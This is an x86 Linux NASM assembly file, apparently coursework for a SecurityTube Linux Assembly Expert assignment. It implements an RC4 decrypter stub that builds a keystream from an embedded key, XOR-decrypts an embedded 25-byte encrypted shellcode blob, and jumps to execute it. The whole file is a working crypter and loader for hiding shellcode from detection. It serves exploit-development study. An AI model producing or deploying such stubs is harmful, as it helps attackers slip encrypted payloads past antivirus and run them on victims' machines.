; Filename:	decrypter.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #7 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:

	;Key Scheduling Algorithm
	;
    	;for (i = 0; i < 256; i++){
  	;   S[i] = i;
  	;}
 	;
    	;for (i = j = 0; i < 256; i++) {
    	;	j = (j + key[i % key_length] + S[i]) & 255;
    	;	swap(S[i] <-> S[j]);
    	;}
    	;i = j = 0;
	;
	 

	;	for (i = 0; i < 256; i++)
  	;      		S[i] = i;
	
	; edx will point to S[0]
	; ecx will be i
	xor ecx, ecx			; clear ecx register 
	mov ecx, 255			; move 255 into ecx
s_arr:	
	dec esp 			; adjust stack
	mov byte[esp], cl		; push bytes onto the stack to populate S array
	loop s_arr			; loop to fill S array
	dec esp				; adjust stack
	mov byte[esp], cl 		; append 0x00 onto the stack for S[0]
	mov edx, esp			; point edx at the esp


    	;for (i = j = 0; i < 256; i++) {
    	;	j = (j + key[i % key_length] + S[i]) & 255;
    	;	swap(S[i] <-> S[j]);
    	;}
    	;i = j = 0;

    	; edx will point to S[0]
   	; eax will point to k[0]
	; ecx will be 
	; ebx will be j	
	; esi will be i	
	xor ebx, ebx			; clear registers for entry to for loop
	xor eax, eax
	xor esi, esi
	jmp load_key
jmp_call_pop_key:
	pop eax				; eax will now point to key[0]
init:
	add bl, byte[edx + esi]		; + S[i]
	push esi
	and esi, 15			; i % key_length
	add bl, byte[eax + esi]		; + key[i % key_length]
	pop esi
	and ebx, 255			; % 256
	xor ecx, ecx
	mov ch, byte[edx + ebx]		; move the byte at S[j] into edx
	mov cl, byte[edx + esi]		; move the byte at S[i] into ebx 
	mov byte[edx + esi], ch		; move the byte at S[j] into S[i]
	mov byte[edx + ebx], cl		; move the byte that was stored at S[i] into S[j] 
	inc esi				; increment for loop
	cmp esi, 256			; condition
	jne init
	xor esi, esi			; i = 0
	xor ebx, ebx			; j = 0

	; Psuedo-Random Generation Algorithm
	; while(n = 0; n < enc_len; n++){
	;	i = (i + 1) % 256
	;	j = (j + S[i]) % 256
	;	swap(S[i] <-> S[j])
	;	keystream[n] = S[(S[i]+ S[j]) % 256]
	;}
	; edx will point to S[0]
	; eax will point to k[0]
	; ecx will be i & S[j]
	; ebx will be j
	; edi will be n
	; esi will be i
	xor ecx, ecx			; clear ecx
	mov ecx, 0x19			; Initialize keystream array
k_arr:	
	dec esp
	mov byte[esp], bl		; copy 0s onto the stack
	loop k_arr			; loop to fill the array of size enc_len
	mov eax, esp 			; point eax at k[0]
	xor edi, edi			; clear edi to use as n
prga:
	add esi, 0x1 			; i + 1
	and esi, 0xff			; (i + 1)% 256
	add bl, byte[edx + esi]		; add S[i] to J
	and ebx, 0xff			; (j + S[i]) % 256
	push eax
	xor eax, eax
	xor ecx, ecx
	mov al, byte[edx + ebx] 	; S[j]
	mov cl, byte[edx + esi] 	; S[i] 
	mov byte[edx + ebx], cl
	mov byte[edx + esi], al 	; swap(S[i] <-> S[j])
	add ecx, eax			; S[i] + S[j]
	pop eax
	and ecx, 0xff			; % 256
	push ebx
	xor ebx, ebx
	mov bl, byte[edx + ecx]		; move the byte S[S[i]+ S[j]) % 256] into ebx
	mov byte[eax + edi], bl 	; move the byte into k[n]
	pop ebx 			; return original value of j
	inc edi				; increment n
	cmp edi, 0x19			; compare n with length
	jne prga


	; Decrypt (encrypted data XOR keystream)
	; for (i = 0; i < length of data; i++) {
	; 	shellcode[i] ^ keystream[i]
	;}
	; call shellcode
	; 
	; eax = k[0]
	; ebx = shellcode[0]
	; esi = i
	xor esi, esi			; clear esi
	jmp load_enc_sc
jmp_call_pop_sc:
	pop ebx				; pop address of shellcode[0] into ebx
decrypt:	
	xor edx, edx			; clear eax
	xor ecx, ecx			; clear ebx
	mov dl, byte[ebx+esi]		; move byte at shellcode[i] into eax
	mov cl, byte[eax+esi]		; move byte at keystream[i] into ebx
	xor edx, ecx			; xor the bytes
	mov byte[ebx+esi], dl 		; replace the byte at shellcode[i]
	inc esi				; increment count
	cmp esi, 0x19			; check for length
	je sc 				; jmp to shellcode once decrypted
	jmp decrypt 			; else loop

load_key:
 	call jmp_call_pop_key
	key: db 0xb3,0x6c,0x07,0x25,0x67,0x73,0x00,0x7d,0x2f,0xfc,0x7e,0xcf,0x4d,0x97,0xd4,0x25
load_enc_sc:
	call jmp_call_pop_sc
 	sc: db 0x86,0x86,0x50,0x04,0xb7,0xde,0x8f,0xf0,0x31,0x7e,0xdc,0x9f,0x93,0x4e,0x6a,0xad,0x55,0x21,0x1e,0x19,0x11,0xc0,0x35,0x13,0xfd
